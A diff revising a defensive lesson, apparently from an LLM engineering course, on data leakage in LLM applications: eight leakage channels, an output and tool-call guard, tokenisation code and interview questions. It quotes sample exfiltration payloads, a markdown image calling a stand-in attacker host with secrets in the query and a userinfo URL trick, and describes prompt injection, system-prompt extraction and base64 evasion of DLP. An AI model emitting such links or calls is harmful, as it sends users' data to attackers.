@@ -5,7 +5,7 @@ name: Data leakage
 kind: concept
 difficulty: core
 est_minutes: 17
-status: reviewed
+status: crisp
 related:
   - safety-security/pii-redaction
   - safety-security/cross-tenant-data-leakage
@@ -23,99 +23,130 @@ sources:
 ---
 
 ## TL;DR
-Data leakage in an LLM system is any path by which information crosses a boundary it should not: into a
-third-party API, into another user's answer, into model weights, or out through a tool call or rendered
-link. It is distinct from ML train/test leakage. Channels multiply because an LLM app copies data into
-prompts, caches, traces, embeddings and weights, and the model repeats whatever it has seen. So minimise
-what enters, control what leaves, and assume no boundary exists inside the prompt.
+Data leakage is any path where information crosses a boundary it should not: to a provider, another
+user, model weights, a tool call or a rendered link. Minimise what enters, control what leaves, and assume
+no boundary exists inside the prompt.
 
 ## Why it exists
-In a conventional service, data flows are enumerable: request, handler, database, response, each with a
-schema, so a privacy review can draw the diagram and sign it. An LLM application dissolves that. It
-concatenates fragments from many sources into one free-text prompt, sends that prompt to a model that is
-often hosted by someone else, stores prompt and completion in an observability tool by default, derives
-embeddings that are stored in yet another system, and produces output that may contain any of it in any
-order. The model has no notion that one part of its context is confidential and another is not.
-
-Three naive answers each cover a sliver. "The provider does not train on API data" may be true, yet
-retention windows, subprocessors and abuse-monitoring logs still exist, and in practice your own trace
-store, readable by every engineer, is the larger exposure. "Tell the model to keep the system prompt
-secret" fails because extracting the system prompt is a routine jailbreak, so any secret or authority
-encoded there is already public; the OWASP list treats system prompt leakage as its own item for that
-reason. "We redact PII" handles one data class, while API keys, contract terms, unreleased financials and
-other users' messages are not PII and sail through. You need a map of every channel, because the one you
-did not draw is the one that leaks.
+- **It is not ML train/test leakage.** It is information escaping: into a third-party API, another user's
+  answer, model weights, or out through a tool call or rendered link.
+- **Conventional data flows are enumerable.** Request, handler, database, response, each with a schema, so a
+  privacy review can draw the diagram and sign it.
+- **An LLM app dissolves that.** It concatenates many sources into one free-text prompt, sends it to a model
+  often hosted by someone else, stores prompt and completion in an observability tool by default, derives
+  embeddings stored elsewhere, and emits output that may contain any of it in any order. The model has no
+  notion that one part of its context is confidential.
+- **Three naive answers each cover a sliver.**
+  - *"The provider does not train on API data"*: retention windows, subprocessors and abuse-monitoring
+    logs still exist, and your own trace store, readable by every engineer, is usually the larger exposure.
+  - *"Tell the model to keep the system prompt secret"*: extraction is a routine jailbreak, so any secret or
+    authority there is already public; OWASP lists system prompt leakage as its own item for that reason.
+  - *"We redact PII"*: API keys, contract terms, unreleased financials and other users' messages are not
+    PII and sail through.
+- **You need a map of every channel,** because the one you did not draw is the one that leaks.
 
 ## How it works
-### Channel 1: inbound to the provider
-Everything in the prompt leaves your boundary. Controls: a data-processing agreement, zero-retention or
-regional endpoints where offered, and above all minimisation. Classify fields before they reach the prompt
-builder and strip what the task does not need. For identifiers the model does not have to understand,
-tokenise: replace the account number with an opaque placeholder, run the model, re-hydrate on the way
-out. The model never sees the real value, so no downstream channel can leak it.
+### The channel map
+| Channel | What leaks | Primary controls |
+|---|---|---|
+| **Channel 1: inbound to the provider** | everything in the prompt leaves your boundary | data-processing agreement, zero-retention or regional endpoints where offered, above all minimisation |
+| **Channel 2: outbound in the completion** | system prompt, retrieved documents, other participants' messages in a shared thread, secrets in tool results | nothing secret or authority-bearing in the prompt; output DLP; canaries |
+| **Channel 3: tools and rendering** | data POSTed anywhere an injected instruction names; silent image GETs | no remote images, egress allow-lists, taint-based tool restriction |
+| **Channel 4: observability and logs** | a second copy of your most sensitive data with weaker access control | redact before export, field-level access, retention in days |
+| **Channel 5: memorisation in weights** | verbatim training data, extractable | retrieval over fine-tuning, deduplication, extraction probes |
+| **Channel 6: embeddings** | most of the original text, via inversion | same classification and access control as the source |
+| **Channel 7: caches and memory** | one person's data returned to another | key must include the principal |
+| **Channel 8: people and unsanctioned tools** | code, contracts, exports pasted into consumer chatbots | a sanctioned tool that is as convenient |
 
-### Channel 2: outbound in the completion
-The model repeats context: the system prompt, retrieved documents, other participants' messages in a
-shared thread, tool results that happened to contain a secret. Design so nothing in the prompt is secret
-or authority-bearing; authorization lives server-side. Scan completions with output DLP: regex for
-high-precision secret formats (cloud access keys, private key headers, JWTs), NER for personal data, and
-canary tokens planted in confidential documents so verbatim regurgitation is detectable.
+### Channels 1-2: what enters and what comes back
+1. **Classify fields before they reach the prompt builder** and strip what the task does not need.
+2. **Tokenise identifiers the model need not understand:** replace the account number with an opaque
+   placeholder, run the model, re-hydrate on the way out. The model never sees the real value, so no
+   downstream channel can leak it.
+3. **Design the prompt so nothing in it is secret or authority-bearing;** authorization lives server-side,
+   because the model repeats its context.
+4. **Scan completions with output DLP:** regex for high-precision secret formats (cloud access keys, private
+   key headers, JWTs), NER for personal data, and canary tokens planted in confidential documents so
+   verbatim regurgitation is detectable.
 
 ### Channel 3: exfiltration through tools and rendering
-An agent with a network tool can POST data anywhere an injected instruction names. Subtler: a completion
-containing `![](https://attacker.example/?d=<secret>)` is rendered by the chat client as an image, and the
-browser issues the GET carrying whatever the model placed in the query string. No tool call, no user
-click. Controls: do not render remote images from model output, or proxy them through an allow-list;
-restrict egress hosts for tools; disable outbound tools once untrusted content has entered the context.
+- **Network tools:** an agent can POST data anywhere an injected instruction names.
+- **Silent rendering:** a completion containing `![](https://attacker.example/?d=<secret>)` is rendered as an
+  image, and the browser issues the GET carrying whatever the model put in the query string. No tool
+  call, no user click.
+- **Controls:** do not render remote images from model output, or proxy them through an allow-list;
+  restrict egress hosts for tools; disable outbound tools once untrusted content has entered the context.
 
 ### Channel 4: observability and logs
-Tracing SDKs capture full prompts and completions, ship them to a SaaS backend, and keep them
-indefinitely, which quietly creates a second copy of your most sensitive data with weaker access control.
-Redact at the SDK layer before export, apply field-level access, set retention measured in days, and treat
-the trace store as carrying the classification of the most sensitive thing that passes through it.
+- **The default is dangerous:** tracing SDKs capture full prompts and completions, ship them to a SaaS
+  backend and keep them indefinitely.
+- **Controls:** redact at the SDK layer before export, apply field-level access, set retention measured in
+  days, and give the trace store the classification of the most sensitive thing passing through it.
 
 ### Channel 5: memorisation in weights
-Models memorise training data, and extraction is practical. Carlini et al. recovered verbatim sequences
-from GPT-2 in 2021; Nasr et al. in 2023 extracted training data from production chat models by pushing
-them to diverge from their fine-tuned behaviour (the "repeat this word forever" attack). Memorisation
-rises with duplication and model scale. For per-customer data prefer retrieval over fine-tuning, because a
-document in a store can be filtered and deleted while an example in the weights cannot; if you must
-train, deduplicate aggressively, exclude raw secrets and identifiers, and test with membership-inference
-and extraction probes. Differentially private training exists but costs significant utility.
+- **Extraction is practical.** Carlini et al. recovered verbatim sequences from GPT-2 in 2021; Nasr et al. in
+  2023 extracted training data from production chat models by pushing them to diverge from their
+  fine-tuned behaviour (the "repeat this word forever" attack).
+- **Memorisation rises with duplication and model scale.**
+- **Prefer retrieval over fine-tuning for per-customer data,** because a document in a store can be filtered
+  and deleted while an example in the weights cannot.
+- **If you must train:** deduplicate aggressively, exclude raw secrets and identifiers, and test with
+  membership-inference and extraction probes. Differentially private training exists but costs
+  significant utility.
 
-### Channel 6: embeddings
-Embeddings are not anonymisation. Inversion methods recover most of the original text from a sentence
-embedding (Morris et al., 2023). A vector store therefore inherits the classification and access control
-of the text it was built from; encrypt it at rest and do not ship embeddings of confidential text to a
-less trusted system on the theory that they are "just numbers".
-
-### Channel 7: caches and memory
-Semantic caches and agent memory keyed without the user or tenant return one person's data to another.
-The cross-tenant lesson covers the mechanics; the principle is the same: the key must include the
-principal.
-
-### Channel 8: people and unsanctioned tools
-The cheapest leak needs no attacker: an employee pastes source code, a contract or a customer export into
-a consumer chatbot under a personal account, outside any data-processing agreement. It was widely reported
-in 2023 that engineers at a large electronics maker had done exactly this with internal code. Technical
-controls here are blunt (egress proxies, browser DLP); the effective one is providing a sanctioned tool
-that is as convenient, because people route around bans.
+### Channels 6-8: embeddings, caches, people
+- **Embeddings are not anonymisation.** Inversion recovers most of the original text from a sentence
+  embedding (Morris et al., 2023). Encrypt the vector store at rest, give it the source's classification
+  and access control, and never ship embeddings of confidential text to a less trusted system as "just
+  numbers".
+- **Caches and memory keyed without the user or tenant** return one person's data to another; the
+  cross-tenant lesson covers the mechanics. The key must include the principal.
+- **People need no attacker.** An employee pastes source code, a contract or a customer export into a
+  consumer chatbot under a personal account, outside any data-processing agreement. It was widely reported
+  in 2023 that engineers at a large electronics maker did exactly this with internal code.
+- **Technical controls for people are blunt** (egress proxies, browser DLP); the effective one is a
+  sanctioned tool that is as convenient, because people route around bans.
 
 ### Ordering the controls: prevent, contain, detect
-The channels share one design rule: put the weight on controls that do not need to recognise the data.
-*Prevention* (minimisation, tokenisation, not training on it) works on data that never entered.
-*Containment* (egress allow-lists, no remote image rendering, scoped stores) works whatever the model
-writes, because it limits where bytes can go rather than inspecting them. *Detection* (output DLP,
-canaries) comes last because it is defeatable: a model instructed to base64-encode a key, split it across
-words, or translate a paragraph defeats a pattern match, while it cannot defeat an egress allow-list that
-has no route to the attacker. Detection still earns its place for accidental leaks, which are not
-adversarial and so do keep their recognisable format.
+Put the weight on controls that do not need to recognise the data.
 
-## Example
-An output guard that runs on every completion and every tool call before execution. It blocks known secret
-formats and planted canary tokens, strips remote markdown images (the silent-GET exfiltration channel), and
-refuses tool arguments that would contact a host outside the allow-list. It is deliberately high-precision:
-it will not catch everything, but what it catches it catches reliably.
+| Order | Controls | Why it is ranked here |
+|---|---|---|
+| 1. **Prevention** | minimisation, tokenisation, not training on it | works on data that never entered |
+| 2. **Containment** | egress allow-lists, no remote image rendering, scoped stores | works whatever the model writes, because it limits where bytes go rather than inspecting them |
+| 3. **Detection** | output DLP, canaries | defeatable: base64-encoding a key, splitting it across words or translating a paragraph beats a pattern match |
+
+- **Containment beats encoding tricks:** a model cannot defeat an egress allow-list that has no route to the
+  attacker.
+- **Detection still earns its place for accidental leaks,** which are not adversarial and so keep their
+  recognisable format.
+
+## Diagram
+Follow sensitive data from source to every place it can land; prevention acts before the prompt,
+containment at the edges, detection last.
+
+```mermaid
+flowchart TD
+    S[("Source data")] --> P["Minimise + tokenise"]
+    P --> B["Prompt builder"]
+    B --> PR["Provider model"]
+    B --> TR[("Traces: redact before export")]
+    B --> E[("Embeddings + caches")]
+    PR --> O["Completion"]
+    O --> G["Output guard: DLP, canaries"]
+    G --> R["Client render: no remote images"]
+    G --> T["Tool call"]
+    T --> A{"Host on egress allow-list?"}
+    A -->|"no"| X["Blocked"]
+    A -->|"yes"| H["Host you control"]
+```
+
+## Examples
+### An output and tool-call guard
+Runs on every completion and every tool call before execution. It blocks known secret formats and planted
+canaries, strips remote markdown images (the silent-GET channel), and refuses tool arguments that would
+contact a host outside the allow-list. It is deliberately high-precision: it will not catch everything,
+but what it catches it catches reliably.
 
 ```python
 import re
@@ -159,57 +190,105 @@ def guard_tool_call(name: str, args: dict) -> None:
 #   guard_tool_call(call.name, call.args); then execute the call
 ```
 
-Trace two attacks through it. An injected document makes the model write
-`![s](https://x.example/p.png?d=jane@corp.example)`: `guard_completion` rewrites it to
-`[image removed: https://x.example/p.png]`, so the client never issues the GET and the query string never
-leaves. An injected instruction makes the agent call `fetch_url(url="https://docs.example.com@x.example/")`:
-the userinfo trick makes the real host `x.example`, which the normalisation exposes and the allow-list
-rejects. Now the attack the guard does not stop: the model base64-encodes an AWS key into a tool argument
-addressed to an allow-listed host. The secret pattern misses it, so the only thing that saves you is that
-the allow-listed host is one you control. That is the prevent-contain-detect ordering in miniature.
-Pair this with the inbound side: minimisation and tokenisation before the prompt is built, and redaction in
-the tracing SDK, so the guard is the last line rather than the only one.
+### Tracing attacks through the guard
+| Attack | What the guard does | Result |
+|---|---|---|
+| Injected document makes the model write `![s](https://x.example/p.png?d=jane@corp.example)` | `guard_completion` rewrites it to `[image removed: https://x.example/p.png]` | client never issues the GET; the query string never leaves |
+| Agent calls `fetch_url(url="https://docs.example.com@x.example/")` | userinfo is dropped, so the real host `x.example` is exposed | allow-list rejects it |
+| Raw AWS key (for example AWS's documented sample `AKIAIOSFODNN7EXAMPLE`) in a tool argument | secret pattern matches | blocked |
+| Model base64-encodes an AWS key into an argument to an allow-listed host | secret pattern misses it | only saved because the allow-listed host is one you control |
+
+- **That last row is prevent-contain-detect in miniature.** Pair the guard with the inbound side
+  (minimisation and tokenisation before the prompt is built, redaction in the tracing SDK), so it is the
+  last line rather than the only one.
+
+### Tokenising identifiers before the prompt
+The model sees placeholders; real values come back only on the way out. Pure Python, runnable.
+
+```python
+import re, secrets
+
+ACCOUNT = re.compile(r"\b\d{8,12}\b")          # this app's account-number format
+
+def tokenise(text: str) -> tuple[str, dict]:
+    vault = {}
+    def swap(m):
+        ph = f"<ACCT_{secrets.token_hex(3)}>"
+        vault[ph] = m.group(0)
+        return ph
+    return ACCOUNT.sub(swap, text), vault
+
+def rehydrate(text: str, vault: dict) -> str:
+    for ph, real in vault.items():
+        text = text.replace(ph, real)
+    return text
+
+prompt, vault = tokenise("Customer disputes a charge on account 40021187 and 77310045.")
+print(prompt)                                    # the model only ever sees placeholders
+reply = f"Opened a dispute for {list(vault)[0]}." # stand-in for the model's answer
+print(rehydrate(reply, vault))                   # real value restored on the way out
+```
+
+- **Keep the vault per request and server-side;** it is the only place the real values live, so it must
+  not be logged with the trace.
+
+## Production patterns
+- **Field classification at the prompt builder.** Tag each field that can enter a prompt (public, internal,
+  confidential, restricted) and have the builder drop or tokenise anything above the route's allowed
+  level. Monitor the share of prompt fields that are classified.
+- **Redaction in the tracing pipeline.** Mask or drop prompt and completion bodies before export (an
+  SDK-side processor or the collector's attribute-processing step), restrict raw-body access to a small
+  group, and set retention measured in days. Monitor trace redaction coverage on sampled spans.
+- **Markdown sanitisation in the client.** Render model output with remote images disabled or proxied
+  through an allow-listed image proxy, and apply a Content-Security-Policy `img-src` that excludes
+  arbitrary hosts. Monitor CSP violation reports, which flag exfiltration attempts.
+- **Egress proxy for agent tools.** Send all tool HTTP through a forward proxy with a host allow-list, and
+  never allow-list hosts that store or reflect content. Monitor blocked-egress events per tool.
+- **Canary documents in confidential corpora.** Plant unique tokens in sensitive documents and alert when
+  one appears in any completion, trace or outbound request. Monitor canary hits as a sev-1 signal.
+- **A sanctioned internal assistant.** Offer an approved chat tool under a data-processing agreement so
+  employees stop pasting into consumer accounts. Track adoption and blocked consumer-chatbot traffic.
 
 ## Trade-offs
-- Minimising and tokenising inputs removes whole classes of leakage, but every field you strip is one the
-  model cannot reason about; when the task genuinely needs the raw value, move the control to the output
-  and egress side instead.
-- Zero-retention provider endpoints shrink the inbound exposure, yet they can disable provider-side
-  features such as abuse monitoring or caching, and they do nothing about your own logs.
-- Output DLP with high-precision patterns rarely blocks legitimate answers but misses paraphrased or
-  partially quoted secrets; widening the patterns raises false positives until users route around the
-  guard, so tune it on a sample of real completions.
-- Egress allow-lists stop exfiltration regardless of encoding, but they break agents whose job is open-ended
-  browsing; for those, split the work so the browsing agent holds no private data and the agent with
+- **Minimisation and tokenisation vs reasoning.** They remove whole classes of leakage, but every stripped
+  field is one the model cannot reason about. When the task needs the raw value, move the control to the
+  output and egress side instead.
+- **Zero-retention endpoints vs features.** They shrink inbound exposure but can disable provider-side
+  features such as abuse monitoring or caching, and do nothing about your own logs.
+- **High-precision DLP vs coverage.** It rarely blocks legitimate answers but misses paraphrased or partially
+  quoted secrets. Widening patterns raises false positives until users route around the guard, so tune it
+  on a sample of real completions.
+- **Egress allow-lists vs open browsing.** They stop exfiltration regardless of encoding but break
+  open-ended browsing agents. Split the work so the browsing agent holds no private data and the agent with
   private data has no open egress, instead of loosening the list.
-- Retrieval instead of fine-tuning keeps customer data deletable and filterable, but it costs retrieval
-  engineering and prompt tokens on every call; fine-tuning is only the right trade when the data is not
-  sensitive or is fully synthetic.
+- **Retrieval vs fine-tuning.** Retrieval keeps customer data deletable and filterable, at the cost of
+  retrieval engineering and prompt tokens on every call. Fine-tuning is only the right trade when the data
+  is not sensitive or is fully synthetic.
 
 ## Pitfalls
-- Encoding authorization or secrets in the system prompt ("you may only access accounts of user 1234");
-  the symptom is a jailbreak that prints the prompt and a customer who now knows the trick.
-- Leaving the tracing SDK on its default of capturing full prompts and completions; the symptom is a
-  privacy review discovering that a third-party dashboard contains months of customer conversations.
-- Rendering markdown from model output with remote images enabled; the symptom is outbound requests to
-  unfamiliar hosts with suspiciously long query strings in the client's network log.
-- Treating embeddings as safe to share with a lower-trust vendor or region; the symptom is a data-residency
+- **Authorization or secrets in the system prompt** ("you may only access accounts of user 1234"). Symptom:
+  a jailbreak prints the prompt and a customer now knows the trick.
+- **Tracing SDK left on full capture.** Symptom: a privacy review discovers a third-party dashboard with
+  months of customer conversations.
+- **Rendering remote images from model output.** Symptom: outbound requests to unfamiliar hosts with
+  suspiciously long query strings in the client's network log.
+- **Treating embeddings as safe to share** with a lower-trust vendor or region. Symptom: a data-residency
   finding when someone asks where the vectors live.
-- Allow-listing a host that stores or reflects what it receives (a shared bucket, a public paste or issue
-  tracker, an endpoint with an open redirect); the symptom is zero blocked-egress events while data still
-  turns up outside, because the attacker reads it from the allowed host.
-- Fine-tuning on raw support tickets and testing only task accuracy; the symptom is the model emitting a
-  real customer's name and order details when prompted with a similar ticket.
+- **Allow-listing a host that stores or reflects input** (a shared bucket, a public paste or issue tracker,
+  an endpoint with an open redirect). Symptom: zero blocked-egress events while data still turns up
+  outside, because the attacker reads it from the allowed host.
+- **Fine-tuning on raw support tickets, testing only task accuracy.** Symptom: the model emits a real
+  customer's name and order details when prompted with a similar ticket.
 
 ## When to use
-Run the channel map whenever data with a classification above "public" touches an LLM path: new
-integration, new tracing vendor, new agent tool, new fine-tune. Reach first for minimisation and
-tokenisation, because preventing entry is cheaper than detecting exit; then for egress controls and output
-DLP; and treat training on sensitive data as the last resort. Measure the share of prompt fields that are
-classified, trace redaction coverage, egress allow-list violations blocked, and canary hits in outputs. In
-interviews this appears as "what are all the ways customer data could leave this system?", and a strong
-answer enumerates provider, completion, tools and rendering, logs, weights, embeddings and caches, rather
-than stopping at PII redaction.
+- **Use when:** data classified above "public" touches an LLM path: a new integration, tracing vendor, agent
+  tool or fine-tune. Run the channel map each time.
+- **Reach first for** minimisation and tokenisation, because preventing entry is cheaper than detecting
+  exit; then egress controls and output DLP; treat training on sensitive data as the last resort.
+- **Measure:** the share of prompt fields that are classified, trace redaction coverage, egress allow-list
+  violations blocked, and canary hits in outputs.
+- **Interviews:** "what are all the ways customer data could leave this system?" A strong answer enumerates
+  provider, completion, tools and rendering, logs, weights, embeddings and caches, not just PII redaction.
 
 ## Role lens
 - **Engineer:** Builds the prompt with classified, minimised fields, configures trace redaction, and wires
@@ -235,6 +314,43 @@ embeddings must be treated as sensitive because they are invertible. The recomme
 pre-applied tenant filters, redaction of identifiers before embedding, trace redaction, and a short
 retention policy; fine-tune only on synthetic or de-identified examples if the task truly needs style or
 format adaptation.
+
+## Interview questions
+### Walk me through every channel by which customer data could leave an LLM application.
+- **Inbound and outbound:** the provider receives the whole prompt; the completion can repeat the system
+  prompt, retrieved documents or tool results.
+- **Side doors:** tool calls and rendered images, traces and logs, memorised weights, invertible embeddings,
+  caches and memory keyed without the principal.
+- **People:** employees pasting data into unsanctioned consumer tools.
+
+### A security review finds outbound requests with long query strings to unknown hosts from your chat client. What happened?
+- **Likely markdown-image exfiltration:** an injected instruction made the model emit a remote image whose
+  URL carries data, and the client fetched it with no tool call or click.
+- **Fix:** stop rendering remote images or proxy them through an allow-list, add a CSP `img-src` policy,
+  and strip images in the output guard.
+- **Then** find the injection source in traces and check what data was in that context.
+
+### Why rank prevention and containment above detection?
+- **Detection must recognise the data,** and a model told to base64-encode, split or translate a secret
+  defeats pattern matching.
+- **Prevention and containment do not inspect bytes:** data that never entered cannot leak, and an egress
+  allow-list has no route to the attacker however the data is encoded.
+- **Detection still matters** for accidental leaks, which keep their recognisable format.
+
+### When would you accept fine-tuning on customer data despite memorisation risk?
+- **Only when** the data is not sensitive, or is synthetic or de-identified, and the task truly needs style
+  or format adaptation that retrieval cannot give.
+- **Then** deduplicate aggressively, exclude raw secrets and identifiers, and run membership-inference and
+  extraction probes before release.
+- **Otherwise prefer retrieval,** because documents in a store can be filtered and deleted while weights
+  cannot honour a deletion request without retraining.
+
+### Your output guard blocked zero egress events last month but data still appeared outside. How?
+- **The allow-list probably includes a host that stores or reflects content:** a shared bucket, a public
+  paste or issue tracker, or an endpoint with an open redirect.
+- **The attacker reads it from the allowed host,** so the allow-list passed every request.
+- **Fix:** allow only hosts you control that do not reflect input, and audit allow-list entries for open
+  redirects and user-writable storage.
 
 ## Quiz
 ### Q: Which statement about embeddings and privacy is correct?
